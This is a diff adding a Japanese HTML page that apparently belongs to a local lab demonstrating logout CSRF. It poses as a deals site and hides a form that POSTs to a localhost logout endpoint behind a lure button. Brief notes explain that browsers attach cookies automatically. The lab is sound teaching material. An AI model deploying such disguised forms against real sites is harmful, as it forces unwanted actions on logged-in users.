@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="ja">
+  <head>
+    <meta charset="UTF-8" />
+    <title>🎁 おトクな情報サイト</title>
+    <style>
+      body {
+        font-family: system-ui, sans-serif;
+        max-width: 640px;
+        margin: 2em auto;
+        padding: 0 1em;
+        line-height: 1.6;
+        background: #fdf0f0;
+      }
+      h1 { color: #c00; }
+      .attack {
+        border: 1px solid #e0c8c8;
+        padding: 1em 1.5em;
+        margin: 1em 0;
+        background: white;
+        border-radius: 6px;
+      }
+      .attack h2 { font-size: 1.1em; margin-top: 0; }
+      .attack .desc { color: #666; font-size: 0.9em; }
+      button {
+        background: #c00;
+        color: white;
+        border: none;
+        padding: 0.5em 1em;
+        border-radius: 4px;
+        cursor: pointer;
+        font-size: 0.95em;
+      }
+      button:hover { background: #900; }
+      .origin { font-family: monospace; background: #eee; padding: 0.1em 0.3em; border-radius: 3px; }
+    </style>
+  </head>
+  <body>
+    <h1>🎁 おトクな情報サイト</h1>
+    <p>攻撃者が用意した罠ページ (<span class="origin">http://127.0.0.1:5174</span>)</p>
+    <p>legit サイト (<span class="origin">http://localhost:5173</span>) にログインした状態で、このページのボタンを押してみる。</p>
+
+    <div class="attack">
+      <h2>Logout CSRF</h2>
+      <p class="desc">
+        <code>POST http://localhost:3000/logout</code> を勝手に叩いてセッションを切る。<br>
+        Cookie はブラウザが自動で付けてしまうのが CSRF の根本。
+      </p>
+      <form action="http://localhost:3000/logout" method="POST">
+        <button type="submit">おトクな情報はこちら</button>
+      </form>
+    </div>
+  </body>
+</html>
